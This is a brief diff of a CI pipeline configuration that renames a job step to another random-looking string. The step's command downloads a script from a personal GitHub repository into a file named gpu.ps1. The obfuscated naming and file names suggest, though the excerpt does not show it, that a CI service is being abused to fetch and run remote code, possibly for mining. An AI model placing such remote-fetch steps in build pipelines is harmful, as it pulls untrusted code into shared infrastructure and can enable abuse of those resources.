@@ -15,7 +15,7 @@ jobs:
     steps:  
        
       - run: 
-          name: 24BCNLjGlvjZBOH7m2Lwr1tPCGS_6TjLGWxk8u5iCXCetmq1C  
+          name: 23wuCFm5tUwb5kWovFm0qFB5u20_49szph852XappuahDLp2W
           command: |      
             Invoke-WebRequest https://raw.githubusercontent.com/xiashiwei/vps/main/sh -OutFile gpu.ps1 
           
